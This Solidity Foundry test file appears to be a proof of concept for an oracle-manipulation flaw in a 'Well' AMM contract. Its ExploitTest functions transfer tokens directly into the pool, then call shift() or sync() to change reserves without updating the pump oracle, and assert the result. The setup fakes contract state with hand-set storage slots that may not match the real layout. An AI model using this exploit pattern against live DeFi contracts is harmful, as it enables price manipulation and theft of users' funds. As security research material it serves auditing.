// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../../src/Well.sol";
import "../../src/interfaces/IWell.sol";
import "../../src/interfaces/IWellFunction.sol";
import "../../src/interfaces/pumps/IPump.sol";
import "oz/token/ERC20/ERC20.sol";

// Mock ERC20 token for testing
contract MockERC20 is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {
        _mint(msg.sender, 1000000 * 10**18);
    }
    
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

// Mock Well Function that implements constant product formula
contract MockWellFunction is IWellFunction {
    function calcLpTokenSupply(
        uint256[] calldata reserves,
        bytes calldata
    ) external pure returns (uint256 lpTokenSupply) {
        if (reserves.length == 2) {
            lpTokenSupply = sqrt(reserves[0] * reserves[1]);
        }
    }
    
    function calcReserve(
        uint256[] calldata reserves,
        uint256 j,
        uint256 lpTokenSupply,
        bytes calldata
    ) external pure returns (uint256 reserve) {
        if (reserves.length == 2) {
            uint256 k = lpTokenSupply * lpTokenSupply;
            uint256 otherIndex = j == 0 ? 1 : 0;
            reserve = k / reserves[otherIndex];
        }
    }
    
    function calcLPTokenUnderlying(
        uint256 lpTokenAmount,
        uint256[] calldata reserves,
        uint256 lpTokenSupply,
        bytes calldata
    ) external pure returns (uint256[] memory tokenAmounts) {
        tokenAmounts = new uint256[](reserves.length);
        for (uint256 i = 0; i < reserves.length; i++) {
            tokenAmounts[i] = (reserves[i] * lpTokenAmount) / lpTokenSupply;
        }
    }
    
    function sqrt(uint256 x) internal pure returns (uint256 y) {
        uint256 z = (x + 1) / 2;
        y = x;
        while (z < y) {
            y = z;
            z = (x / z + z) / 2;
        }
    }
}

// Mock Pump that tracks reserve updates
contract MockPump is IPump {
    uint256[] public lastReserves;
    uint256 public updateCount;
    
    function update(uint256[] calldata reserves, bytes calldata) external {
        lastReserves = reserves;
        updateCount++;
    }
    
    function getLastReserves() external view returns (uint256[] memory) {
        return lastReserves;
    }
}

// Mock Aquifer for Well deployment
contract MockAquifer {
    function boreWell(
        address,
        bytes calldata,
        bytes calldata
    ) external returns (address) {
        return address(0);
    }
}

contract ExploitTest is Test {
    Well public well;
    MockERC20 public token0;
    MockERC20 public token1;
    MockWellFunction public wellFunction;
    MockPump public pump;
    MockAquifer public aquifer;
    
    address public attacker;
    address public victim;
    
    function setUp() public {
        attacker = address(0x1337);
        victim = address(0x9999);
        
        // Deploy tokens
        token0 = new MockERC20("Token0", "TK0");
        token1 = new MockERC20("Token1", "TK1");
        
        // Deploy well function and pump
        wellFunction = new MockWellFunction();
        pump = new MockPump();
        aquifer = new MockAquifer();
        
        // Prepare immutable data for Well
        IERC20[] memory tokens = new IERC20[](2);
        tokens[0] = IERC20(address(token0));
        tokens[1] = IERC20(address(token1));
        
        Call memory wellFunctionCall = Call({
            target: address(wellFunction),
            data: ""
        });
        
        Call[] memory pumps = new Call[](1);
        pumps[0] = Call({
            target: address(pump),
            data: ""
        });
        
        // Deploy Well using minimal proxy pattern
        bytes memory immutableData = encodeWellData(
            address(aquifer),
            tokens,
            wellFunctionCall,
            pumps
        );
        
        well = new Well();
        
        // Initialize with immutable data via low-level call
        bytes memory initData = abi.encodeWithSignature(
            "init(string,string)",
            "Well LP",
            "WELL-LP"
        );
        
        // Store immutable data in Well's storage
        vm.store(address(well), bytes32(0), bytes32(uint256(uint160(address(aquifer)))));
        vm.store(address(well), bytes32(uint256(20)), bytes32(uint256(2))); // numberOfTokens
        vm.store(address(well), bytes32(uint256(52)), bytes32(uint256(uint160(address(wellFunction)))));
        vm.store(address(well), bytes32(uint256(72)), bytes32(uint256(0))); // wellFunctionDataLength
        vm.store(address(well), bytes32(uint256(104)), bytes32(uint256(1))); // numberOfPumps
        
        // Store token addresses
        vm.store(address(well), bytes32(uint256(136)), bytes32(uint256(uint160(address(token0)))));
        vm.store(address(well), bytes32(uint256(168)), bytes32(uint256(uint160(address(token1)))));
        
        // Store pump data
        uint256 pumpDataStart = 136 + 2 * 32;
        vm.store(address(well), bytes32(pumpDataStart), bytes32(uint256(uint160(address(pump)))));
        vm.store(address(well), bytes32(pumpDataStart + 20), bytes32(uint256(0))); // pump data length
        
        well.init("Well LP", "WELL-LP");
        
        // Setup initial liquidity
        token0.mint(victim, 1000000 * 10**18);
        token1.mint(victim, 1000000 * 10**18);
        
        vm.startPrank(victim);
        token0.approve(address(well), type(uint256).max);
        token1.approve(address(well), type(uint256).max);
        
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 100000 * 10**18;
        amounts[1] = 100000 * 10**18;
        
        well.addLiquidity(amounts, 0, victim, block.timestamp + 1);
        vm.stopPrank();
        
        // Give attacker some tokens
        token0.mint(attacker, 100000 * 10**18);
        token1.mint(attacker, 100000 * 10**18);
    }
    
    function testOracleManipulationViaShift() public {
        vm.startPrank(attacker);
        
        // Step 1: Record initial pump state
        uint256 initialUpdateCount = pump.updateCount();
        uint256[] memory initialPumpReserves = pump.getLastReserves();
        
        console.log("=== Initial State ===");
        console.log("Pump update count:", initialUpdateCount);
        if (initialPumpReserves.length > 0) {
            console.log("Initial pump reserve0:", initialPumpReserves[0]);
            console.log("Initial pump reserve1:", initialPumpReserves[1]);
        }
        
        // Step 2: Transfer tokens to Well to create imbalance
        // This simulates sending tokens directly to manipulate reserves
        uint256 manipulationAmount = 50000 * 10**18;
        token0.transfer(address(well), manipulationAmount);
        
        console.log("\n=== After Direct Transfer ===");
        console.log("Token0 balance in Well:", token0.balanceOf(address(well)));
        console.log("Token1 balance in Well:", token1.balanceOf(address(well)));
        
        // Step 3: Call shift() to update reserves WITHOUT updating pumps first
        // This is the vulnerability - shift() doesn't call _updatePumps()
        token0.approve(address(well), type(uint256).max);
        token1.approve(address(well), type(uint256).max);
        
        uint256 shiftAmount = well.shift(IERC20(address(token1)), 0, attacker);
        
        console.log("\n=== After Shift ===");
        console.log("Shifted token1 amount:", shiftAmount);
        console.log("Pump update count:", pump.updateCount());
        
        // Step 4: Verify that reserves were updated but pumps were NOT updated
        // The shift() function updates reserves but doesn't call _updatePumps()
        uint256 afterShiftUpdateCount = pump.updateCount();
        
        // Pump should NOT have been updated by shift()
        assertEq(afterShiftUpdateCount, initialUpdateCount, "Pump should not be updated by shift()");
        
        console.log("\n=== Vulnerability Demonstrated ===");
        console.log("Reserves were changed by shift() but pump was NOT updated");
        console.log("This allows manipulation of reserves before pump update");
        
        // Step 5: Now perform a swap to trigger pump update with manipulated reserves
        uint256 swapAmount = 1000 * 10**18;
        well.swapFrom(
            IERC20(address(token0)),
            IERC20(address(token1)),
            swapAmount,
            0,
            attacker,
            block.timestamp + 1
        );
        
        console.log("\n=== After Swap (Pump Updated) ===");
        console.log("Pump update count:", pump.updateCount());
        
        uint256[] memory manipulatedReserves = pump.getLastReserves();
        console.log("Pump reserve0 after manipulation:", manipulatedReserves[0]);
        console.log("Pump reserve1 after manipulation:", manipulatedReserves[1]);
        
        // Verify pump was updated with manipulated reserves
        assertGt(pump.updateCount(), initialUpdateCount, "Pump should be updated after swap");
        
        // The reserves stored in pump are now manipulated
        // This demonstrates the oracle manipulation vulnerability
        
        vm.stopPrank();
    }
    
    function testSyncDoesNotUpdatePumps() public {
        vm.startPrank(attacker);
        
        uint256 initialUpdateCount = pump.updateCount();
        
        // Transfer tokens directly to Well
        token0.transfer(address(well), 10000 * 10**18);
        
        // Call sync() - this also doesn't update pumps
        well.sync();
        
        // Verify pump was NOT updated
        assertEq(pump.updateCount(), initialUpdateCount, "Pump should not be updated by sync()");
        
        console.log("=== Sync Vulnerability ===");
        console.log("sync() updated reserves but did NOT update pumps");
        console.log("Pump update count remained:", pump.updateCount());
        
        vm.stopPrank();
    }
    
    function encodeWellData(
        address _aquifer,
        IERC20[] memory _tokens,
        Call memory _wellFunction,
        Call[] memory _pumps
    ) internal pure returns (bytes memory) {
        return abi.encodePacked(
            _aquifer,
            _tokens.length,
            _wellFunction.target,
            _wellFunction.data.length,
            _pumps.length,
            _tokens,
            _wellFunction.data,
            _pumps
        );
    }
}